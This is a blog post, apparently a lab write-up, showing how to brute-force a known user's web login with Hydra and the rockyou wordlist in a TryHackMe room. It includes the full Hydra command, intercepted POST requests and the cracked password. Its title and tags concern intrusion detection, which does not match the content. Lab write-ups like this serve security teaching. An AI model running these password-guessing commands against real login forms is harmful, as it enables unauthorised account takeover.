---
title: Working With Intrusion Detection System (IDS) Part 2
author: Ansh Vaid
date: 2021-12-07 7:10:00 +0530
categories: [Cyber Forensics]
tags: [IDS, Intrusion Detection System, HIDS, NIDS, Windows, Rules, Malicious, Requests, Linux, Host based]

---

![hack](/assets/EthicalHacking/hydrabanner.jpg)

Image taken from <a href="https://miro.medium.com/max/2000/1*NCTCiMU_5o6EgFKUp90wUA.jpeg">here</a>

---


---

---

In this blog I am going to discuss how a simple login form could be compromised by a dictionary attack if the username of any account is known to the attacker. Many CTF players encounter various challenges in which this technique could be used in cracking the password of user account in web category challenges, and many participants who are beginner in cyber domain, miss this thing.
Discussing about real life scenario, then if a web developer has created a website for a particular organization, where the employees login to their respective portal by entering their username and password only, in such scenarios the login form is very vulnerable if the username of the person is compromised. This is the main reason why login forms ask email id instead, and OTP if you successfully login to account or even a limit on number of requests in a particular time span is set to encounter such attacks.
There are two tools by which this dictionary attack could be done on the login forms:
Burp suite
Hydra
Even CURL could be used to do so if you know how to integrate it with SHELL script. Burp suite is a widely used tool, be it in the penetration testing part, CTFs, MITM attacks, dictionary attacks etc. It has an option to send the intercepted request to intruder (ctrl+i) where dictionary related attacks could be performed. Most of the students download the cracked version of Burp suite professional to unlock advance options. But using such cracked versions have a risk of getting your own device compromised. Most of the people just download the cracked versions to speed up the dictionary attacks. In such cases a person can use Hydra tool, which is widely used to do the dictionary attacks on various services like SSH, FTP etc. and also the login forms too. Also the speed would be more as compared to Burp suite tool, because we can increase or decrease the number of threads of Hydra tool using -t option, and it supports around 44 threads at a time.
Vulnerable lab setup:
> Task 9 of https://tryhackme.com/room/adventofcyber3
> Use openvpn application to access the THM lab
> Username Santa is known beforehand

![hack](/assets/EthicalHacking/hydra1.jpg)
![hack](/assets/EthicalHacking/hydra2.jpg)
![hack](/assets/EthicalHacking/hydra3.jpg)
![hack](/assets/EthicalHacking/hydra4.jpg)

Login form

Username santa known beforehand

Type any random password

Setting up proxy
Run Burp suite tool, start the interceptor and apply the proxy settings in your web browser. Click on Login button in the login page. Since the password is wrong I will definitely get an error message displayed on the screen.

![hack](/assets/EthicalHacking/hydra5.png)
![hack](/assets/EthicalHacking/hydra6.png)

Error message generated on unsuccessful login

Intercepted request after Login button was pressed in login form
Following is the intercepted request that was generated on pressing Login button.
POST / HTTP/1.1
Host: 10.10.238.99
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: http://10.10.238.99
Connection: close
Referer: http://10.10.238.99/
Cookie: PHPSESSID=uep84ftk3h44nhiqerv5p8rovb
Upgrade-Insecure-Requests: 1

username=santa&password=randomPassword&submit=Login
Copy username=santa&password=randomPassword&submit=Login part from the intercepted request, and now I will show how it could be used with hydra to crack the password of username santa.
hydra -l santa -P /usr/share/wordlists/rockyou.txt 10.10.238.99 http-post-form “/:username=^USER^&password=^PASS^&submit=Login:F=Invalid username and password” -V
Explanation of above command is as follows:
> Use -l option if you know the username, and -L option to give a file path having list of usernames. Since username santa is known, therefore option -l is used in above command.
> Use -p option if you know the password, and -P option to give a file path having list of passwords. Since password is unknown, therefore option -P is used in above command. rockyou.txt is the file having list of passwords, and mostly in every CTF you will find the password from this file only.
> IP address or domain name of the website where the form is present
> Since this form is sending the credentials in POST method, therefore http-post-form is used.
> “<URL of the page where login form is present>:<parameter containing username> = ^USER^<parameter containing password> = ^PASS^<paste other parameters as it is>:F=<error message displayed on unsuccessful login which I have shown with arrow in above snapshot>”
> -V option for verbose mode, add -t option if you want to increase the number of threads.

![hack](/assets/EthicalHacking/hydra7.jpg)
![hack](/assets/EthicalHacking/hydra8.png)

PRESS ENTER KEY TO RUN THE COMMAND

Password for username santa is cookie
Now the request will have correct password cookie for username santa.
POST / HTTP/1.1
Host: 10.10.238.99
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://10.10.238.99
Connection: close
Referer: http://10.10.238.99/
Cookie: PHPSESSID=uep84ftk3h44nhiqerv5p8rovb
Upgrade-Insecure-Requests: 1


username=santa&password=cookie&submit=Login

![hack](/assets/EthicalHacking/hydra9.jpg)

Login successful
In this way you can customize the hydra command for other login forms in CTF challenges or in vulnerable websites and your dictionary must have that password in it, otherwise no matches would be found an dictionary will over.
Another room in THM to know more on Hydra: https://tryhackme.com/room/hydra
In this blog I discussed how Hydra could be used instead of Burp suite for a dictionary attack on login page whose username is known. Since the dictionary attack in community edition of burp suite is very slow and cracked version of burp suite could compromise your device, Hydra is a better option in such cases.
Social Media Links: LinkedIn | GitHub | Instagram | Twitter
Visit My Website: https://cybergeeks.website/
Originally published at https://github.com.